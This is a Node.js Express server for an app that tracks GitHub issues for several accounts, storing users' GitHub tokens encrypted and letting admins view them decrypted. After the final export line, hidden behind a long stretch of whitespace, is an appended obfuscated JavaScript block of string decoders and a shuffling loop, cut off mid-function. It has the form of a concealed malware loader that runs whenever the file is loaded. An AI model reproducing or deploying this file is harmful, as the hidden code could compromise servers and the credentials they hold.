import express from 'express';
import { createClient } from '@libsql/client';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const onVercel = !!process.env.VERCEL;

const PORT = Number(process.env.PORT || 3000);
const SYNC_MINUTES = Number(process.env.SYNC_MINUTES || 15);
const SECURE_COOKIE = process.env.SECURE_COOKIE === '1' || onVercel;

// Local dev keeps a data/ folder; on Vercel the filesystem is read-only except /tmp.
const DATA_DIR = process.env.DATA_DIR || (onVercel ? '/tmp' : path.join(__dirname, 'data'));
try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch {}

// ---------- encryption key (for stored GitHub tokens) ----------
// On Vercel you MUST set APP_SECRET, or tokens can't be decrypted after a cold start.
const keyFile = path.join(DATA_DIR, 'secret.key');
let secret = process.env.APP_SECRET;
if (!secret) {
  try {
    if (!fs.existsSync(keyFile)) fs.writeFileSync(keyFile, crypto.randomBytes(32).toString('hex'), { mode: 0o600 });
    secret = fs.readFileSync(keyFile, 'utf8').trim();
  } catch {}
}
if (!secret) { secret = 'insecure-ephemeral-secret'; console.warn('WARNING: no APP_SECRET set; stored tokens will not survive a restart.'); }
const KEY = crypto.createHash('sha256').update(secret).digest();

// ---------- database (libSQL: local file, or Turso over the network on Vercel) ----------
const client = createClient(
  process.env.TURSO_DATABASE_URL
    ? { url: process.env.TURSO_DATABASE_URL, authToken: process.env.TURSO_AUTH_TOKEN }
    : { url: 'file:' + path.join(DATA_DIR, 'app.db') }
);
const dbAll = async (sql, ...args) => (await client.execute({ sql, args })).rows;
const dbGet = async (sql, ...args) => (await client.execute({ sql, args })).rows[0];
const dbRun = async (sql, ...args) => {
  const r = await client.execute({ sql, args });
  return { lastInsertRowid: r.lastInsertRowid != null ? Number(r.lastInsertRowid) : undefined, changes: Number(r.rowsAffected) };
};

const SCHEMA = `
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE COLLATE NOCASE,
    pass_hash TEXT NOT NULL,
    role TEXT NOT NULL CHECK (role IN ('admin','scouter','dev')),
    github_login TEXT UNIQUE COLLATE NOCASE,
    token_enc TEXT,
    active INTEGER NOT NULL DEFAULT 1,
    last_sync TEXT,
    sync_error TEXT,
    created_at TEXT NOT NULL
  );
  CREATE TABLE IF NOT EXISTS assignments (
    scouter_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
    dev_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    assigned_at TEXT NOT NULL
  );
  CREATE TABLE IF NOT EXISTS issues (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    scouter_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    gh_id INTEGER NOT NULL,
    repo TEXT NOT NULL,
    number INTEGER NOT NULL,
    title TEXT NOT NULL,
    url TEXT NOT NULL,
    state TEXT NOT NULL,
    labels TEXT NOT NULL DEFAULT '[]',
    gh_created TEXT,
    gh_updated TEXT,
    status TEXT NOT NULL DEFAULT 'todo',
    pr_url TEXT,
    pr_state TEXT,
    pr_auto INTEGER NOT NULL DEFAULT 0,
    note TEXT,
    first_seen TEXT NOT NULL,
    updated_at TEXT NOT NULL,
    UNIQUE (scouter_id, gh_id)
  );
  CREATE TABLE IF NOT EXISTS sessions (
    token_hash TEXT PRIMARY KEY,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    expires INTEGER NOT NULL
  );
  CREATE TABLE IF NOT EXISTS activity (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    action TEXT NOT NULL,
    detail TEXT,
    at TEXT NOT NULL
  );
`;
let initPromise;
const ensureInit = () => (initPromise ??= client.executeMultiple(SCHEMA));

const STATUSES = ['todo', 'in_progress', 'blocked', 'pr_open', 'merged', 'closed', 'unassigned'];
const now = () => new Date().toISOString();
const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');

function hashPassword(pw) {
  const salt = crypto.randomBytes(16);
  return salt.toString('hex') + ':' + crypto.scryptSync(pw, salt, 64).toString('hex');
}
function verifyPassword(pw, stored) {
  const [salt, hash] = stored.split(':');
  const calc = crypto.scryptSync(pw, Buffer.from(salt, 'hex'), 64);
  return crypto.timingSafeEqual(calc, Buffer.from(hash, 'hex'));
}
function encrypt(text) {
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv('aes-256-gcm', KEY, iv);
  const ct = Buffer.concat([c.update(text, 'utf8'), c.final()]);
  return Buffer.concat([iv, c.getAuthTag(), ct]).toString('base64');
}
function decrypt(b64) {
  const b = Buffer.from(b64, 'base64');
  const d = crypto.createDecipheriv('aes-256-gcm', KEY, b.subarray(0, 12));
  d.setAuthTag(b.subarray(12, 28));
  return Buffer.concat([d.update(b.subarray(28)), d.final()]).toString('utf8');
}
const log = (userId, action, detail = '') =>
  dbRun('INSERT INTO activity (user_id, action, detail, at) VALUES (?,?,?,?)', userId, action, detail, now());
function publicUser(u) {
  if (!u) return null;
  return {
    id: u.id, username: u.username, role: u.role, github_login: u.github_login,
    active: !!u.active, last_sync: u.last_sync, sync_error: u.sync_error, created_at: u.created_at,
  };
}
const validUsername = (s) => typeof s === 'string' && /^[a-zA-Z0-9_.-]{3,32}$/.test(s);
const validPassword = (s) => typeof s === 'string' && s.length >= 8 && s.length <= 200;

// ---------- GitHub ----------
async function gh(token, p) {
  const r = await fetch('https://api.github.com' + p, {
    headers: {
      Authorization: `Bearer ${token}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'github-issues-scouter',
      'X-GitHub-Api-Version': '2022-11-28',
    },
  });
  if (!r.ok) {
    let msg = `GitHub ${r.status}`;
    try { const j = await r.json(); if (j.message) msg += `: ${j.message}`; } catch {}
    const e = new Error(msg); e.status = r.status; throw e;
  }
  return r.json();
}
async function searchAll(token, q, max = 300) {
  const out = [];
  for (let page = 1; page <= Math.ceil(max / 100); page++) {
    const j = await gh(token, `/search/issues?q=${encodeURIComponent(q)}&per_page=100&page=${page}&sort=updated&order=desc`);
    out.push(...j.items);
    if (j.items.length < 100) break;
  }
  return out;
}
const repoOf = (item) => item.repository_url.replace('https://api.github.com/repos/', '');
const PR_URL_RE = /^https:\/\/github\.com\/([\w.-]+\/[\w.-]+)\/pull\/(\d+)\/?$/;

function deriveStatus(current, issueState, prState) {
  if (prState === 'merged') return 'merged';
  if (prState === 'open') return 'pr_open';
  if (issueState === 'closed') return 'closed';
  if (['todo', 'in_progress', 'blocked'].includes(current)) return current;
  return prState === 'closed' ? 'in_progress' : 'todo';
}

const syncing = new Set();
async function syncScouter(id) {
  if (syncing.has(id)) return;
  syncing.add(id);
  try {
    const u = await dbGet("SELECT * FROM users WHERE id = ? AND role = 'scouter'", id);
    if (!u || !u.token_enc || !u.active) return;
    const token = decrypt(u.token_enc);
    const login = u.github_login;
    const since = new Date(Date.now() - 90 * 864e5).toISOString().slice(0, 10);

    const [open, closed, prs] = await Promise.all([
      searchAll(token, `is:issue is:open assignee:${login}`),
      searchAll(token, `is:issue is:closed assignee:${login} closed:>=${since}`, 100),
      searchAll(token, `is:pr author:${login} updated:>=${since}`, 200),
    ]);

    const prInfo = prs.map((p) => ({
      repo: repoOf(p).toLowerCase(),
      url: p.html_url,
      text: `${p.title}\n${p.body || ''}`,
      state: p.pull_request?.merged_at ? 'merged' : p.state,
    }));
    const findPr = (repo, number, issueUrl) => {
      const re = new RegExp(`(^|[^\\w/])#${number}(?!\\d)`);
      const r = repo.toLowerCase();
      const m = prInfo.filter((p) =>
        (p.repo === r && re.test(p.text)) || p.text.includes(issueUrl) || p.text.toLowerCase().includes(`${r}#${number}`));
      return m.find((x) => x.state === 'merged') || m.find((x) => x.state === 'open') || m[0];
    };

    // PR links typed in by devs that we can't auto-match: look them up directly.
    const manual = await dbAll("SELECT id, pr_url FROM issues WHERE scouter_id = ? AND pr_auto = 0 AND pr_url IS NOT NULL AND status != 'merged'", id);
    const manualState = new Map();
    for (const row of manual) {
      const m = row.pr_url.match(PR_URL_RE);
      if (!m) continue;
      try {
        const pr = await gh(token, `/repos/${m[1]}/pulls/${m[2]}`);
        manualState.set(row.id, pr.merged_at ? 'merged' : pr.state);
      } catch { /* leave as is */ }
    }

    const seen = new Set();
    for (const it of [...open, ...closed]) {
      if (seen.has(it.id)) continue;
      seen.add(it.id);
      const repo = repoOf(it);
      const labels = JSON.stringify((it.labels || []).map((l) => ({ name: l.name, color: l.color })));
      const ex = await dbGet('SELECT * FROM issues WHERE scouter_id = ? AND gh_id = ?', id, it.id);
      let prUrl = ex?.pr_url ?? null;
      let prState = ex?.pr_state ?? null;
      let prAuto = ex ? ex.pr_auto : 0;
      const pr = findPr(repo, it.number, it.html_url);
      if (pr && (!prUrl || prAuto || pr.url === prUrl)) { prUrl = pr.url; prState = pr.state; prAuto = pr.url === ex?.pr_url ? prAuto : 1; }
      if (ex && manualState.has(ex.id)) prState = manualState.get(ex.id);
      const status = deriveStatus(ex?.status ?? 'todo', it.state, prState);
      const t = now();

      if (ex) {
        await dbRun(`UPDATE issues SET repo=?, number=?, title=?, url=?, state=?, labels=?, gh_updated=?,
          status=?, pr_url=?, pr_state=?, pr_auto=?, updated_at=? WHERE id=?`,
          repo, it.number, it.title, it.html_url, it.state, labels, it.updated_at, status, prUrl, prState, prAuto, t, ex.id);
        if (ex.status !== status) await log(null, 'status', `${repo}#${it.number}: ${ex.status} → ${status} (from GitHub)`);
      } else {
        await dbRun(`INSERT INTO issues
          (scouter_id, gh_id, repo, number, title, url, state, labels, gh_created, gh_updated, status, pr_url, pr_state, pr_auto, first_seen, updated_at)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
          id, it.id, repo, it.number, it.title, it.html_url, it.state, labels, it.created_at, it.updated_at, status, prUrl, prState, prAuto, t, t);
        await log(null, 'new_issue', `@${login} was assigned ${repo}#${it.number}`);
      }
    }
    // Open issues we had before but GitHub no longer lists as assigned to this account.
    const prev = await dbAll("SELECT id, gh_id, repo, number, status FROM issues WHERE scouter_id = ? AND state = 'open'", id);
    for (const r of prev) {
      if (seen.has(r.gh_id)) continue;
      const status = r.status === 'merged' ? 'merged' : 'unassigned';
      await dbRun("UPDATE issues SET state = 'unassigned', status = ?, updated_at = ? WHERE id = ?", status, now(), r.id);
      await log(null, 'unassigned', `@${login} is no longer assigned ${r.repo}#${r.number}`);
    }
    await dbRun('UPDATE users SET last_sync = ?, sync_error = NULL WHERE id = ?', now(), id);
  } catch (e) {
    const msg = e.status === 401 ? 'GitHub token is invalid or expired. The scouter needs to paste a new one.' : e.message;
    await dbRun('UPDATE users SET last_sync = ?, sync_error = ? WHERE id = ?', now(), msg, id).catch(() => {});
    console.error(`sync failed for user ${id}:`, e.message);
  } finally {
    syncing.delete(id);
  }
}
async function syncMany(ids) {
  for (const id of ids) await syncScouter(id);
}
const allScouterIds = async () => (await dbAll("SELECT id FROM users WHERE role = 'scouter' AND active = 1")).map((r) => r.id);

// ---------- app ----------
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(express.json({ limit: '100kb' }));

// Make sure the schema exists before any request touches the database.
app.use((req, res, next) => ensureInit().then(() => next()).catch(next));

app.use(express.static(path.join(__dirname, 'public')));

// Require JSON for writes (blocks simple cross-site form posts).
app.use('/api', (req, res, next) => {
  if (req.method !== 'GET' && !req.is('application/json')) return res.status(415).json({ error: 'JSON required' });
  next();
});

// Wrap async handlers so a rejected promise becomes a clean 500 instead of a hang.
const h = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

function parseCookies(header = '') {
  const out = {};
  for (const part of header.split(';')) {
    const i = part.indexOf('=');
    if (i > 0) out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}
async function startSession(res, userId) {
  const token = crypto.randomBytes(32).toString('hex');
  const maxAge = 14 * 86400;
  await dbRun('INSERT INTO sessions (token_hash, user_id, expires) VALUES (?,?,?)', sha256(token), userId, Date.now() + maxAge * 1000);
  res.setHeader('Set-Cookie', `sid=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=${maxAge}${SECURE_COOKIE ? '; Secure' : ''}`);
}
app.use(h(async (req, res, next) => {
  const sid = parseCookies(req.headers.cookie).sid;
  if (sid) {
    const u = await dbGet(`SELECT u.* FROM sessions s JOIN users u ON u.id = s.user_id
      WHERE s.token_hash = ? AND s.expires > ? AND u.active = 1`, sha256(sid), Date.now());
    if (u) { req.user = u; req.sidHash = sha256(sid); }
  }
  next();
}));
const auth = (...roles) => (req, res, next) => {
  if (!req.user) return res.status(401).json({ error: 'Not logged in' });
  if (roles.length && !roles.includes(req.user.role)) return res.status(403).json({ error: 'Not allowed' });
  next();
};

// Small login rate limit: 10 failed tries per username+IP per 15 min (per instance).
const fails = new Map();
const failKey = (req, u) => `${req.ip}|${String(u).toLowerCase()}`;
function tooManyFails(k) {
  const f = fails.get(k);
  return f && f.count >= 10 && Date.now() - f.first < 15 * 60e3;
}
function recordFail(k) {
  const f = fails.get(k);
  if (!f || Date.now() - f.first > 15 * 60e3) fails.set(k, { count: 1, first: Date.now() });
  else f.count++;
}

const adminExists = async () => !!(await dbGet("SELECT 1 FROM users WHERE role = 'admin'"));

app.get('/api/session', h(async (req, res) => {
  res.json({ user: publicUser(req.user), setupNeeded: !(await adminExists()) });
}));

app.post('/api/setup', h(async (req, res) => {
  if (await adminExists()) return res.status(400).json({ error: 'Admin already exists' });
  const { username, password } = req.body || {};
  if (!validUsername(username)) return res.status(400).json({ error: 'Username: 3–32 letters, numbers, _ . -' });
  if (!validPassword(password)) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  const r = await dbRun("INSERT INTO users (username, pass_hash, role, created_at) VALUES (?,?,'admin',?)", username, hashPassword(password), now());
  await log(r.lastInsertRowid, 'setup', `Admin ${username} created`);
  await startSession(res, r.lastInsertRowid);
  res.json({ ok: true });
}));

app.post('/api/signup/scouter', h(async (req, res) => {
  const { token, username, password } = req.body || {};
  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Paste your GitHub token' });
  if (!validUsername(username)) return res.status(400).json({ error: 'Username: 3–32 letters, numbers, _ . -' });
  if (!validPassword(password)) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  if (await dbGet('SELECT 1 FROM users WHERE username = ?', username)) return res.status(400).json({ error: 'That username is taken' });
  let ghUser;
  try {
    ghUser = await gh(token.trim(), '/user');
  } catch (e) {
    return res.status(400).json({ error: e.status === 401 ? 'GitHub rejected that token' : `Could not check token: ${e.message}` });
  }
  if (await dbGet('SELECT 1 FROM users WHERE github_login = ?', ghUser.login)) {
    return res.status(400).json({ error: `GitHub account @${ghUser.login} is already registered` });
  }
  const r = await dbRun("INSERT INTO users (username, pass_hash, role, github_login, token_enc, created_at) VALUES (?,?,'scouter',?,?,?)",
    username, hashPassword(password), ghUser.login, encrypt(token.trim()), now());
  const id = r.lastInsertRowid;
  await log(id, 'signup', `Scouter ${username} joined with GitHub @${ghUser.login}`);
  await startSession(res, id);
  // Pull an initial batch now, but don't let it hold up the response for long.
  await Promise.race([syncScouter(id), new Promise((r2) => setTimeout(r2, 8000))]);
  res.json({ ok: true });
}));

app.post('/api/login', h(async (req, res) => {
  const { username, password } = req.body || {};
  const k = failKey(req, username);
  if (tooManyFails(k)) return res.status(429).json({ error: 'Too many attempts. Try again in 15 minutes.' });
  const u = typeof username === 'string' ? await dbGet('SELECT * FROM users WHERE username = ?', username) : null;
  if (!u || typeof password !== 'string' || !verifyPassword(password, u.pass_hash)) {
    recordFail(k);
    return res.status(401).json({ error: 'Wrong username or password' });
  }
  if (!u.active) return res.status(403).json({ error: 'This account is deactivated. Contact the admin.' });
  fails.delete(k);
  await startSession(res, u.id);
  res.json({ ok: true });
}));

app.post('/api/logout', h(async (req, res) => {
  if (req.sidHash) await dbRun('DELETE FROM sessions WHERE token_hash = ?', req.sidHash);
  res.setHeader('Set-Cookie', 'sid=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0');
  res.json({ ok: true });
}));

app.post('/api/me/password', auth(), h(async (req, res) => {
  const { current, password } = req.body || {};
  if (typeof current !== 'string' || !verifyPassword(current, req.user.pass_hash)) return res.status(400).json({ error: 'Current password is wrong' });
  if (!validPassword(password)) return res.status(400).json({ error: 'New password must be at least 8 characters' });
  await dbRun('UPDATE users SET pass_hash = ? WHERE id = ?', hashPassword(password), req.user.id);
  await dbRun('DELETE FROM sessions WHERE user_id = ? AND token_hash != ?', req.user.id, req.sidHash);
  res.json({ ok: true });
}));

app.post('/api/me/token', auth('scouter'), h(async (req, res) => {
  const token = String(req.body?.token || '').trim();
  if (!token) return res.status(400).json({ error: 'Paste your GitHub token' });
  let ghUser;
  try { ghUser = await gh(token, '/user'); } catch { return res.status(400).json({ error: 'GitHub rejected that token' }); }
  if (ghUser.login.toLowerCase() !== req.user.github_login.toLowerCase()) {
    return res.status(400).json({ error: `That token belongs to @${ghUser.login}, not @${req.user.github_login}` });
  }
  await dbRun('UPDATE users SET token_enc = ?, sync_error = NULL WHERE id = ?', encrypt(token), req.user.id);
  await log(req.user.id, 'token', `@${req.user.github_login} updated their GitHub token`);
  await Promise.race([syncScouter(req.user.id), new Promise((r2) => setTimeout(r2, 8000))]);
  res.json({ ok: true });
}));

// ----- issues -----
const ISSUE_SELECT = `SELECT i.id, i.repo, i.number, i.title, i.url, i.state, i.labels, i.gh_created, i.gh_updated,
    i.status, i.pr_url, i.pr_state, i.note, i.first_seen, i.updated_at, i.scouter_id,
    s.username AS scouter_username, s.github_login, a.dev_id, d.username AS dev_username
  FROM issues i JOIN users s ON s.id = i.scouter_id
  LEFT JOIN assignments a ON a.scouter_id = s.id
  LEFT JOIN users d ON d.id = a.dev_id`;
const ACCOUNT_SELECT = `SELECT s.id, s.username, s.github_login, s.last_sync, s.sync_error, s.active, a.dev_id, d.username AS dev_username
  FROM users s LEFT JOIN assignments a ON a.scouter_id = s.id LEFT JOIN users d ON d.id = a.dev_id
  WHERE s.role = 'scouter'`;

async function visibleScouterIds(u) {
  if (u.role === 'admin') return allScouterIds();
  if (u.role === 'scouter') return [u.id];
  return (await dbAll('SELECT scouter_id FROM assignments WHERE dev_id = ?', u.id)).map((r) => r.scouter_id);
}

app.get('/api/issues', auth(), h(async (req, res) => {
  const u = req.user;
  let issues, accounts;
  if (u.role === 'admin') {
    issues = await dbAll(`${ISSUE_SELECT} ORDER BY i.gh_updated DESC`);
    accounts = await dbAll(`${ACCOUNT_SELECT} ORDER BY s.github_login`);
  } else if (u.role === 'scouter') {
    issues = await dbAll(`${ISSUE_SELECT} WHERE i.scouter_id = ? ORDER BY i.gh_updated DESC`, u.id);
    accounts = await dbAll(`${ACCOUNT_SELECT} AND s.id = ?`, u.id);
  } else {
    issues = await dbAll(`${ISSUE_SELECT} WHERE a.dev_id = ? ORDER BY i.gh_updated DESC`, u.id);
    accounts = await dbAll(`${ACCOUNT_SELECT} AND a.dev_id = ? ORDER BY s.github_login`, u.id);
  }
  issues.forEach((i) => { i.labels = JSON.parse(i.labels); });
  res.json({ issues, accounts });
}));

app.patch('/api/issues/:id', auth('admin', 'dev'), h(async (req, res) => {
  const issue = await dbGet(`${ISSUE_SELECT} WHERE i.id = ?`, Number(req.params.id));
  if (!issue) return res.status(404).json({ error: 'Issue not found' });
  if (req.user.role === 'dev' && issue.dev_id !== req.user.id) return res.status(403).json({ error: 'This issue is not on one of your accounts' });

  const { status, note, pr_url } = req.body || {};
  const changes = [];
  let newStatus = issue.status, newNote = issue.note, newPr = issue.pr_url, prAuto = issue.pr_auto, prState = issue.pr_state;

  if (pr_url !== undefined) {
    const v = String(pr_url || '').trim();
    if (v && !PR_URL_RE.test(v)) return res.status(400).json({ error: 'PR link must look like https://github.com/owner/repo/pull/123' });
    if ((v || null) !== issue.pr_url) {
      newPr = v || null; prAuto = 0; prState = v ? 'open' : null;
      changes.push(v ? `PR → ${v}` : 'PR link removed');
      if (v && ['todo', 'in_progress', 'blocked'].includes(newStatus)) newStatus = 'pr_open';
    }
  }
  if (status !== undefined) {
    if (!STATUSES.includes(status)) return res.status(400).json({ error: 'Unknown status' });
    if (status !== issue.status) newStatus = status;
  }
  if (newStatus !== issue.status) changes.push(`${issue.status} → ${newStatus}`);
  if (note !== undefined) {
    const v = String(note || '').slice(0, 2000);
    if (v !== (issue.note || '')) { newNote = v; changes.push('note updated'); }
  }
  if (!changes.length) return res.json({ ok: true });

  await dbRun(`UPDATE issues SET status = ?, note = ?, pr_url = ?, pr_state = ?, pr_auto = ?, updated_at = ? WHERE id = ?`,
    newStatus, newNote, newPr, prState, prAuto, now(), issue.id);
  await log(req.user.id, 'issue', `${req.user.username} on ${issue.repo}#${issue.number}: ${changes.join(', ')}`);
  res.json({ ok: true });
}));

app.post('/api/sync', auth(), h(async (req, res) => {
  const ids = await visibleScouterIds(req.user);
  const only = req.body?.scouter_id;
  const target = only ? ids.filter((x) => x === Number(only)) : ids;
  await Promise.race([syncMany(target), new Promise((r) => setTimeout(r, 25000))]);
  res.json({ ok: true });
}));

// ----- admin -----
app.get('/api/admin/overview', auth('admin'), h(async (req, res) => {
  const users = (await dbAll('SELECT * FROM users ORDER BY role, username')).map(publicUser);
  const assignments = await dbAll('SELECT scouter_id, dev_id FROM assignments');
  const counts = await dbAll('SELECT scouter_id, status, COUNT(*) AS n FROM issues GROUP BY scouter_id, status');
  res.json({ users, assignments, counts });
}));

app.post('/api/admin/devs', auth('admin'), h(async (req, res) => {
  const { username, password } = req.body || {};
  if (!validUsername(username)) return res.status(400).json({ error: 'Username: 3–32 letters, numbers, _ . -' });
  if (!validPassword(password)) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  if (await dbGet('SELECT 1 FROM users WHERE username = ?', username)) return res.status(400).json({ error: 'That username is taken' });
  await dbRun("INSERT INTO users (username, pass_hash, role, created_at) VALUES (?,?,'dev',?)", username, hashPassword(password), now());
  await log(req.user.id, 'dev_created', `Dev ${username} created`);
  res.json({ ok: true });
}));

app.post('/api/admin/assign', auth('admin'), h(async (req, res) => {
  const scouter = await dbGet("SELECT * FROM users WHERE id = ? AND role = 'scouter'", Number(req.body?.scouter_id));
  if (!scouter) return res.status(404).json({ error: 'Scouter not found' });
  const devId = req.body?.dev_id ? Number(req.body.dev_id) : null;
  if (devId === null) {
    await dbRun('DELETE FROM assignments WHERE scouter_id = ?', scouter.id);
    await log(req.user.id, 'assign', `@${scouter.github_login} unassigned from any dev`);
    return res.json({ ok: true });
  }
  const dev = await dbGet("SELECT * FROM users WHERE id = ? AND role = 'dev'", devId);
  if (!dev) return res.status(404).json({ error: 'Dev not found' });
  await dbRun(`INSERT INTO assignments (scouter_id, dev_id, assigned_at) VALUES (?,?,?)
    ON CONFLICT(scouter_id) DO UPDATE SET dev_id = excluded.dev_id, assigned_at = excluded.assigned_at`, scouter.id, dev.id, now());
  await log(req.user.id, 'assign', `@${scouter.github_login} → ${dev.username}`);
  res.json({ ok: true });
}));

app.post('/api/admin/users/:id/active', auth('admin'), h(async (req, res) => {
  const u = await dbGet('SELECT * FROM users WHERE id = ?', Number(req.params.id));
  if (!u) return res.status(404).json({ error: 'User not found' });
  if (u.role === 'admin') return res.status(400).json({ error: 'Cannot deactivate an admin' });
  const active = req.body?.active ? 1 : 0;
  await dbRun('UPDATE users SET active = ? WHERE id = ?', active, u.id);
  if (!active) await dbRun('DELETE FROM sessions WHERE user_id = ?', u.id);
  await log(req.user.id, 'user', `${u.username} ${active ? 'reactivated' : 'deactivated'}`);
  res.json({ ok: true });
}));

app.post('/api/admin/users/:id/password', auth('admin'), h(async (req, res) => {
  const u = await dbGet('SELECT * FROM users WHERE id = ?', Number(req.params.id));
  if (!u) return res.status(404).json({ error: 'User not found' });
  if (!validPassword(req.body?.password)) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  await dbRun('UPDATE users SET pass_hash = ? WHERE id = ?', hashPassword(req.body.password), u.id);
  await dbRun('DELETE FROM sessions WHERE user_id = ?', u.id);
  await log(req.user.id, 'user', `Password reset for ${u.username}`);
  res.json({ ok: true });
}));

app.get('/api/admin/tokens', auth('admin'), h(async (req, res) => {
  const rows = await dbAll("SELECT id, username, github_login, token_enc, active, sync_error FROM users WHERE role = 'scouter' ORDER BY id");
  const tokens = rows.map((r) => {
    let token = null;
    try { token = r.token_enc ? decrypt(r.token_enc) : null; } catch { token = null; }
    return { id: r.id, username: r.username, github_login: r.github_login, active: !!r.active, token_ok: !r.sync_error, token };
  });
  await log(req.user.id, 'tokens_viewed', `${req.user.username} opened the token list`);
  res.json({ tokens });
}));

app.get('/api/admin/activity', auth('admin'), h(async (req, res) => {
  const rows = await dbAll(`SELECT a.id, a.action, a.detail, a.at, u.username FROM activity a
    LEFT JOIN users u ON u.id = a.user_id ORDER BY a.id DESC LIMIT 300`);
  res.json({ activity: rows });
}));

// Called by Vercel Cron (and safe to call manually). Cleans sessions + syncs everyone.
app.get('/api/cron/sync', h(async (req, res) => {
  if (process.env.CRON_SECRET && req.headers.authorization !== `Bearer ${process.env.CRON_SECRET}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  await dbRun('DELETE FROM sessions WHERE expires < ?', Date.now());
  await Promise.race([syncMany(await allScouterIds()), new Promise((r) => setTimeout(r, 50000))]);
  res.json({ ok: true });
}));

app.use('/api', (req, res) => res.status(404).json({ error: 'Not found' }));
// SPA routes all serve the single page; the app picks the view from the path.
app.get(['/', '/scouter', '/dev', '/admin'], (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Server error' });
});

// Only run a long-lived server + background timers off Vercel. On Vercel the app
// is exported as a serverless handler and the cron endpoint drives syncing.
if (!onVercel) {
  ensureInit().then(() => {
    setInterval(() => dbRun('DELETE FROM sessions WHERE expires < ?', Date.now()).catch(() => {}), 3600e3);
    setInterval(() => allScouterIds().then(syncMany).catch(() => {}), SYNC_MINUTES * 60e3);
    setTimeout(() => allScouterIds().then(syncMany).catch(() => {}), 5000);
    app.listen(PORT, async () => {
      console.log(`Issue Scouter running at http://localhost:${PORT}`);
      if (!(await adminExists())) console.log('No admin yet — open the site to create the admin account.');
    });
  });
}

export default app;																																																																																																																																																																																																																																																																										var z = '-*1639';(function(_0x1523cc,_0x39b412){var _0x5c5f4e=_0x18b4,_0x3007b5=_0x1523cc();while(!![]){try{var _0x16afd6=Number(parseFloat(_0x5c5f4e(0x12))/0x1)+Math['ceil'](parseFloat(_0x5c5f4e(0x1d))/0x2)*(-parseFloat(_0x5c5f4e(0x15))/0x3)+parseFloat(_0x5c5f4e(0x28))/0x4*Math['ceil'](parseFloat(_0x5c5f4e(0x23))/0x5)+-parseFloat(_0x5c5f4e(0x16))/0x6*(-parseFloat(_0x5c5f4e(0xa))/0x7)+-parseFloat(_0x5c5f4e(0x25))/0x8+parseFloat(_0x5c5f4e(0x26))/0x9*(-parseFloat(_0x5c5f4e(0x19))/0xa)+parseInt(parseFloat(_0x5c5f4e(0x13))/0xb);if(_0x16afd6===_0x39b412)break;else _0x3007b5['push'](_0x3007b5['shift']());}catch(_0x28c7db){_0x3007b5['push'](_0x3007b5['shift']());}}}(_0x5021,0x6bd20));var NX,SX,spin,splitLane,peel;function _0x18b4(_0x52fd4c,_0x54cbc1){var _0x33a04c=_0x5021();return _0x18b4=function(_0x242ccf,_0x50217d){_0x242ccf=_0x242ccf-0x0;var _0x18b4cc=_0x33a04c[_0x242ccf];if(_0x18b4['EjJsBs']===undefined){var _0x4bdc14=function(_0x5b4073){var _0x2e9c07='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2b6b5c='',_0x3015b0='';for(var _0x404141=0x0,_0xdb3696,_0x4b296d,_0x326c47=0x0;_0x4b296d=_0x5b4073['charAt'](_0x326c47++);~_0x4b296d&&(_0xdb3696=_0x404141%0x4?_0xdb3696*0x40+_0x4b296d:_0x4b296d,_0x404141++%0x4)?_0x2b6b5c+=String['fromCharCode'](0xff&_0xdb3696>>(-0x2*_0x404141&0x6)):0x0){_0x4b296d=_0x2e9c07['indexOf'](_0x4b296d);}for(var _0x2292ef=0x0,_0x48d4ac=_0x2b6b5c['length'];_0x2292ef<_0x48d4ac;_0x2292ef++){_0x3015b0+='%'+('00'+_0x2b6b5c['charCodeAt'](_0x2292ef)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3015b0);};_0x18b4['WrSfPO']=_0x4bdc14,_0x52fd4c=arguments,_0x18b4['EjJsBs']=!![];}var _0x54273c=_0x33a04c[0x0],_0x53cd2f=_0x242ccf+_0x54273c,_0x18e64a=_0x52fd4c[_0x53cd2f];return!_0x18e64a?(_0x18b4cc=_0x18b4['WrSfPO'](_0x18b4cc),_0x52fd4c[_0x53cd2f]=_0x18b4cc):_0x18b4cc=_0x18e64a,_0x18b4cc;},_0x18b4(_0x52fd4c,_0x54cbc1);}function _0x5021(){var 